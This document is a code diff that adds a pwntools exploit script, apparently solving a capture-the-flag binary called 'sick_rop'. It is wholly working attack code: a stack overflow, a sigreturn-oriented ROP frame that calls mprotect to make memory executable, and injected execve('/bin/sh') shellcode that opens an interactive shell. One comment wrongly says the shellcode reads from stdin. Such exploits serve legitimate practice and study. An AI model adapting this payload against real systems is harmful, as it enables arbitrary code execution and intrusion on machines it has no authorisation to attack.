@@ -1,0 +1,46 @@
+from pwn import *
+
+context.log_level = 'debug'
+elf = context.binary = ELF('./sick_rop')
+
+p = process(elf.path)
+
+print(p.pid)
+
+
+#-----------------------------------------------------------------------------------------------#
+# Shellcode to read from stdin into writable memory
+shellcode = (b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05') # 22 byte sheellcode
+#-----------------------------------------------------------------------------------------------#
+
+vuln = 0x40102e
+syscall_ret = 0x401014
+shellcode_start = 0x4010b8
+
+#-----------------------------------------------------------------------------------------------#
+#for making writtable memory
+
+SYS_MPROTECT = 10
+
+frame1 = SigreturnFrame()
+frame1.rax = SYS_MPROTECT
+frame1.rdi = 0x400000
+frame1.rsi = 0x2000
+frame1.rdx = 7
+frame1.rip = syscall_ret
+frame1.rsp = 0x4010d8
+
+payload1 = b"A"*32 + b'B' * 8 + p64(vuln) + p64(syscall_ret) + bytes(frame1)
+
+# #-----------------------------------------------------------------------------------------------#
+
+
+p.sendline(payload1)
+
+p.sendline(b'A' * 14)
+ 
+shell = shellcode + b'A' * (40 - len(shellcode)) + pack(0x4010b8)
+
+p.send(shell)
+
+p.interactive()
